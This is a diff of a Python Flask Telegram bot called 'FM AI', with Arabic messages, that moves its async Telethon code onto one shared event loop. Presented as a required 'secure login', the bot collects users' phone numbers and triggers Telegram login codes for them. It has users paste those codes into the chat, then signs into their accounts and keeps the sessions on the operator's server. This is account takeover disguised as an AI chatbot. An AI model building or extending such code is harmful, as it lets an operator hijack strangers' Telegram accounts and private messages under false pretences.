@@ -5,12 +5,6 @@ import requests
 import threading
 from flask import Flask, request
 from telethon import TelegramClient
-from telethon.errors import (
-    SessionPasswordNeededError,
-    PhoneNumberInvalidError,
-    PhoneCodeExpiredError,
-    PhoneCodeInvalidError
-)
 
 app = Flask(__name__)
 
@@ -23,7 +17,9 @@ BASE_URL = f"https://api.telegram.org/bot{TOKEN}"
 AI_SERVER = "https://kruri.qzz.io/chat/send"
 
 users = {}
-clients = {}
+
+# ✅ Event loop رئيسي موحد للتطبيق كله
+main_loop = asyncio.new_event_loop()
 
 def send_message(chat_id, text, reply_markup=None):
     payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
@@ -31,8 +27,8 @@ def send_message(chat_id, text, reply_markup=None):
         payload["reply_markup"] = reply_markup
     try:
         requests.post(f"{BASE_URL}/sendMessage", json=payload, timeout=10)
-    except Exception as e:
-        print(f"Error sending message: {e}")
+    except:
+        pass
 
 def request_phone_keyboard():
     return {
@@ -61,50 +57,23 @@ def get_ai_reply(user_message):
     except:
         return "خطأ في الاتصال بالذكاء الاصطناعي"
 
-# ✅ تشغيل الكود غير المتزامن في خيط منفصل
-def run_async_in_thread(coroutine_func, chat_id, *args):
-    """يشغل coroutine في خيط منفصل مع event loop خاص به"""
-    def runner():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            result = loop.run_until_complete(coroutine_func(chat_id, *args))
-            
-            # إرسال النتيجة للمستخدم في الخيط الرئيسي
-            if result["success"]:
-                if "phone" in result.get("data", {}):
-                    send_message(chat_id,
-                        f"📱 <b>تم إرسال رمز التحقق!</b>\n\n"
-                        f"• رقم الهاتف: <code>+{result['data']['phone']}</code>\n"
-                        f"• <b>افتح تطبيق تلغرام على هاتفك</b>\n"
-                        f"• ستجد رمزًا مكونًا من 5 أرقام\n\n"
-                        f"🔐 <b>أرسل هذا الرمز هنا الآن:</b>")
-                elif "verified" in result.get("data", {}):
-                    send_message(chat_id,
-                        f"✅ <b>تم تسجيل الدخول بنجاح!</b>\n\n"
-                        f"🎉 أهلاً بك في بوت FM AI!\n"
-                        f"اختر من الأزرار أدناه للبدء 👇",
-                        get_main_keyboard())
-            else:
-                send_message(chat_id, f"❌ <b>{result['error']}</b>")
-        except Exception as e:
-            send_message(chat_id, f"❌ فشل تسجيل الدخول: {str(e)}")
-        finally:
-            loop.close()
-    
-    threading.Thread(target=runner, daemon=True).start()
+# ✅ تشغيل async على الـ event loop الموحد
+def run_async(func, *args):
+    """يشغل دالة async على الـ main loop"""
+    future = asyncio.run_coroutine_threadsafe(func(*args), main_loop)
+    return future.result(timeout=30)
 
 # ✅ إرسال رمز التحقق
-async def async_send_code(chat_id, phone):
+async def send_telegram_code(chat_id, phone):
     try:
         session_name = f"session_{chat_id}"
-        client = TelegramClient(session_name, API_ID, API_HASH)
-        
+        client = TelegramClient(session_name, API_ID, API_HASH, loop=main_loop)
         await client.connect()
         
         if await client.is_user_authorized():
             await client.disconnect()
-            return {"success": False, "error": "هذا الرقم مسجل دخوله بالفعل."}
+            send_message(chat_id, "❌ هذا الرقم مسجل دخوله بالفعل.")
+            return
         
         sent_code = await client.send_code_request(phone)
         users[chat_id] = {
@@ -115,42 +84,61 @@ async def async_send_code(chat_id, phone):
             "client": client
         }
         
-        return {"success": True, "data": {"phone": phone}}
-        
-    except PhoneNumberInvalidError:
-        return {"success": False, "error": "رقم الهاتف غير صالح."}
+        send_message(
+            chat_id,
+            f"📱 <b>تم إرسال رمز التحقق!</b>\n\n"
+            f"• رقم الهاتف: <code>+{phone}</code>\n"
+            f"• <b>افتح تطبيق تلغرام على هاتفك</b>\n"
+            f"• ستجد رمزًا مكونًا من 5 أرقام\n\n"
+            f"🔐 <b>أرسل هذا الرمز هنا الآن:</b>"
+        )
     except Exception as e:
-        return {"success": False, "error": f"فشل إرسال الرمز: {str(e)}"}
+        send_message(chat_id, f"❌ فشل إرسال الرمز: {str(e)}")
 
-# ✅ التحقق من الرمز
-async def async_verify_code(chat_id, code):
+# ✅ التحقق من رمز الدخول
+async def verify_telegram_code(chat_id, code):
     user = users.get(chat_id)
     if not user or not user.get("client"):
-        return {"success": False, "error": "انتهت الجلسة، ابدأ من جديد."}
+        send_message(chat_id, "❌ انتهت الجلسة، ابدأ من جديد /start")
+        return
     
     try:
         client = user["client"]
-        
         await client.sign_in(
-            phone=user['phone'],
+            phone=user["phone"],
             code=code,
-            phone_code_hash=user['phone_code_hash']
+            phone_code_hash=user["phone_code_hash"]
         )
         
         user_info = await client.get_me()
         user["verified"] = True
-        user["user_info"] = {"first_name": user_info.first_name, "username": user_info.username}
+        user["user_info"] = {
+            "first_name": user_info.first_name,
+            "username": user_info.username
+        }
         
-        return {"success": True, "data": {"verified": True}}
-        
-    except PhoneCodeInvalidError:
-        return {"success": False, "error": "الرمز غير صحيح."}
-    except PhoneCodeExpiredError:
-        return {"success": False, "error": "انتهت صلاحية الرمز."}
-    except SessionPasswordNeededError:
-        return {"success": False, "error": "الحساب محمي بكلمة مرور (تحقق بخطوتين)."}
+        send_message(
+            chat_id,
+            f"✅ <b>تم تسجيل الدخول بنجاح!</b>\n\n"
+            f"🎉 أهلاً بك {user_info.first_name} في بوت FM AI!\n"
+            f"اختر من الأزرار أدناه للبدء 👇",
+            get_main_keyboard()
+        )
     except Exception as e:
-        return {"success": False, "error": f"فشل تسجيل الدخول: {str(e)}"}
+        user["attempts"] = user.get("attempts", 0) + 1
+        if user["attempts"] >= 3:
+            users[chat_id] = {"verified": False}
+            send_message(chat_id, "❌ <b>تم تجاوز عدد المحاولات.</b> ابدأ من جديد /start")
+        else:
+            remaining = 3 - user["attempts"]
+            send_message(chat_id, f"❌ <b>الرمز غير صحيح!</b>\nالمحاولات المتبقية: {remaining}")
+
+# ✅ تشغيل الـ main loop في الخلفية
+def start_main_loop():
+    asyncio.set_event_loop(main_loop)
+    main_loop.run_forever()
+
+threading.Thread(target=start_main_loop, daemon=True).start()
 
 @app.route("/webhook", methods=["POST"])
 def webhook():
@@ -165,7 +153,7 @@ def webhook():
     if "contact" in data["message"]:
         phone = data["message"]["contact"]["phone_number"]
         send_message(chat_id, "⏳ <b>جاري إرسال رمز التحقق...</b>")
-        run_async_in_thread(async_send_code, chat_id, phone)
+        main_loop.call_soon_threadsafe(lambda: asyncio.ensure_future(send_telegram_code(chat_id, phone)))
         return "OK", 200
     
     text = data["message"].get("text", "").strip()
@@ -174,19 +162,22 @@ def webhook():
     if not user.get("verified"):
         if text == "/start" or text == "🔄 إعادة تشغيل":
             users[chat_id] = {"verified": False}
-            send_message(chat_id,
+            send_message(
+                chat_id,
                 "👋 <b>مرحباً بك في بوت FM AI!</b>\n\n"
                 "للاستمرار، يجب تسجيل الدخول الآمن عبر تلغرام.\n"
                 "الرجاء مشاركة رقم هاتفك 👇",
-                request_phone_keyboard())
+                request_phone_keyboard()
+            )
         
         elif user.get("phone_code_hash") and text.isdigit():
             send_message(chat_id, "⏳ <b>جاري التحقق من الرمز...</b>")
-            run_async_in_thread(async_verify_code, chat_id, text)
+            main_loop.call_soon_threadsafe(lambda: asyncio.ensure_future(verify_telegram_code(chat_id, text)))
+        
         return "OK", 200
     
     # ✅ مستخدم موثق
-    threading.Thread(target=lambda: requests.post(f"{BASE_URL}/sendChatAction", json={"chat_id": chat_id, "action": "typing"})).start()
+    requests.post(f"{BASE_URL}/sendChatAction", json={"chat_id": chat_id, "action": "typing"})
     
     if text == "/start" or text == "🔄 إعادة تشغيل":
         name = user.get("user_info", {}).get("first_name", "مستخدم")
@@ -206,7 +197,7 @@ def webhook():
 
 @app.route("/")
 def home():
-    return "FM AI Bot with Thread-Safe Telethon", 200
+    return "FM AI Bot - Event Loop Unified", 200
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
